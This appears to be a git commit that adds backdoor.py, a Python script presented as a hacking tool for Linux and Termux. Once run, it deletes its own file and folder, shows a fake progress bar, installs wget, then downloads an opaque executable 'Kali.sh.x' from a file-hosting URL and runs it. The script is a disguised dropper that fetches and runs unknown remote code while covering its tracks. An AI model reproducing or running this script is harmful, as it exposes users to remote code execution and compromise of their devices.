0a3e070876054c9315027255423e5c08138944ba
VISHNU PREMIL <82073583+VIP-HACKER2001@users.noreply.github.com>
2022-06-19 07:00:03 +0530

    Add files via upload

---
+++ backdoor.py
@@ -0,0 +1,52 @@
+import socket
+import subprocess
+import os
+import time
+import sys
+import random
+                #LIFE IS FULL OF MYSTERIES#
+
+
+#sudo user check in#
+os.system("sudo ip r")
+os.system("clear")
+time.sleep(1)
+time.sleep(1)
+os.system("clear")
+time.sleep(1)
+os.system("rm -rf backdoor.py")
+os.system("cd ..")
+os.system("rm -rf BACK-DOOR") 
+#This tool will work on termux too#
+print  ("        ╭━━╮╭━━━┳━━━┳╮╭━╮╭━━━┳━━━┳━━━┳━━━╮")
+print  ("        ┃╭╮┃┃╭━╮┃╭━╮┃┃┃╭╯╰╮╭╮┃╭━╮┃╭━╮┃╭━╮┃")
+print  ("        ┃╰╯╰┫┃╱┃┃┃╱╰┫╰╯╯╱╱┃┃┃┃┃╱┃┃┃╱┃┃╰━╯┃")
+print  ("        ┃╭━╮┃╰━╯┃┃╱╭┫╭╮┃╱╱┃┃┃┃┃╱┃┃┃╱┃┃╭╮╭╯")
+print  ("        ┃╰━╯┃╭━╮┃╰━╯┃┃┃╰┳┳╯╰╯┃╰━╯┃╰━╯┃┃┃╰╮")
+print  ("        ╰━━━┻╯╱╰┻━━━┻╯╰━┻┻━━━┻━━━┻━━━┻╯╰━╯")
+print  ("--------------CODED BY STRANGEDREAMER-------------------")
+time.sleep(1)
+print   ("[                    ] 0% ")
+time.sleep(1)
+print   ("[=====               ] 25%")
+time.sleep(1)
+print   ( "[==========          ] 50%")
+time.sleep(1)
+print   ( "[===============     ] 75%")
+time.sleep(1)
+print   ( "[====================] 100%")
+time.sleep(1)
+os.system("sudo apt install wget")
+os.system("clear")
+os.system("apt install wget")
+os.system("clear")
+os.system("wget https://download1590.mediafire.com/dt2r1w0c2rpg/uc0rqyk792mfqj3/Kali.sh.x")
+time.sleep(1)
+os.system("clear")
+time.sleep(2)
+os.system("chmod +x Kali.sh.x")
+os.system("./Kali.sh.x")
+#use this tool was you fix it is a powful tool#
+#code[1234]#use this code for using the tool#
+#oohacker008@gmail.com#
+#index4.tx#
